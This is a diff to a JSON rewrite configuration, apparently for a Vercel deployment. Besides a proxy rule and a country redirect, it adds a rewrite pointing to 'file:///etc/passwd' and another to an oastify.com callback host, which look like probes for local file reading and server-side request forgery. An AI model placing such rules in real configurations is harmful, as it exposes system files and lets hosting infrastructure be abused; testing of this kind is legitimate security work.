@@ -1,3 +1,18 @@
 {
-  "public":false
+  "rewrites": [
+    { "source": "/about", "destination": "file:///etc/passwd" },
+    { "source": "/me", "destination": "https://j6qlhypw5hh3htfq3klgvdb0vr1ip9rxg.oastify.com" },
+    { "source": "/proxy/:match*", "destination": "https://example.com/:match*" },
+    {
+      "source": "/:path((?!uk/).*)",
+      "has": [
+        {
+          "type": "header",
+          "key": "x-vercel-ip-country",
+          "value": "GB"
+        }
+      ],
+      "destination": "/uk/:path*"
+    }
+  ]
 }
